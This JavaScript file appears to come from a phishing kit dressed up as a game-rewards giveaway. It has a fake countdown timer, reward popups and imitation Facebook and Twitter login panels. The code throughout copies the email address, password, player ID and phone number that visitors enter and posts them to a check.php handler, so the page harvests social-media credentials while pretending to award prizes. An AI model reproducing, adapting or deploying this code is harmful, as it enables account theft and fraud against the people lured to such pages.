// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for random id
var slidePlayer = 0;
openSlides();
function openSlides() {
    var i;
    var slides = document.getElementsByClassName("event-notification-player");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slidePlayer++;
    if (slidePlayer > slides.length) {slidePlayer = 1} 
    slides[slidePlayer-1].style.display = "block"; 
    setTimeout(openSlides, 2500);
}

// code for showing hiding popup
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_verification(){
	$('.account_verification').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$('.processing-section').show();
		$('.rewards-section').hide();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};